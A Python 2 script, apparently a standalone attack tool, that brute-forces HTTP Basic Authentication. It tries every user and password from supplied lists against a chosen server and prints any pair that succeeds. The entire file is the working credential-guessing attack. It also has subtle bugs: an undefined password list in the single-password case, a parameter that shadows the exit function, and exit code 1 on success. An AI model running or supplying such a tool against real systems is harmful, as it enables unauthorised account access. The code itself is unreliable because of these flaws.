#!/usr/bin/python
# -*- coding: utf-8 -*-

from sys import stderr, exit
from requests import get
from requests.exceptions import ConnectionError
import optparse

def print_error(msg, exit = False):
	stderr.write('Error:\t%s\n' % msg)
	if exit:
		exit(1)

def check_options(opts):
	if opts.server is None:
		print_error('Debes especificar un servidor a atacar.', True)
	elif opts.user is None and opts.users is None:
		print_error('Debes especificar un usuario o un archivo con una lista de usuarios.', True)
	elif opts.password is None and opts.passwords is None:
		print_error('Debes especificar una contrasena o una lista de contrasenas.', True)

def build_url(server, port, protocol = 'http'):
	url = '%s://%s:%s' % (protocol, server, port)
	return url


def add_options():
	parser = optparse.OptionParser()

	parser.add_option('--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
	parser.add_option('-s', '--server', dest='server', default=None, help='Host that will be attacked.')
	parser.add_option('-u', '--user', dest='user', default=None, help='single user you want to try.')
	parser.add_option('-p' , '--password', dest='password', default=None, help='single password you want to try.')
	parser.add_option('-U', '--users', dest='users', default=None, help='file which contanins all users you want to try.')
	parser.add_option('-P', '--passwords', dest='passwords', default=None, help='file which contanins all passwords you want to try.')
	parser.add_option('-v', '--verbose', dest='verbose', default=False, help='Verbose mode.', action='store_true')

	opts,args = parser.parse_args()

	return opts

def make_request(url, opts):
	if opts.users is not None:
		with open(opts.users, 'r') as users_file:
			users = [item.strip() for item in users_file.readlines()]
			if opts.user is not None:
				users.append(opts.user.strip())
	else:
		users = [opts.user.strip()]

	if opts.passwords is not None:
		with open(opts.passwords, 'r') as passwords_file:
			passwords = [item.strip() for item in passwords_file.readlines()]
			if opts.password is not None:
				passwords.append(opts.password.strip())
	else:
		password = [opts.password.strip()]

	try:
		for user in users:
			for password in passwords:
				response = get(url, auth = (user, password))
				if opts.verbose:
					print 'Trying: User > %s | Pass > %s' % (user, password)
					if response.status_code == 200:
						print '\n\tSUCCESS: User > %s | Pass > %s' % (user, password)
						exit(1)
					else:
						print '\tDid not work!'
				else:
					if response.status_code == 200:
						print 'SUCCESS: User > %s | Pass > %s' % (user, password)
						exit(1)
	except ConnectionError:
		print_error('Error en la conexion, tal vez el servidor no esta arriba.', True)

if __name__ == '__main__':
	try:
		opts = add_options()
		check_options(opts)
		url = build_url(opts.server, port = opts.port)
		make_request(url, opts)
	except Exception as e:
		print_error('Ocurrio un error inesperado')
		print_error(e, True)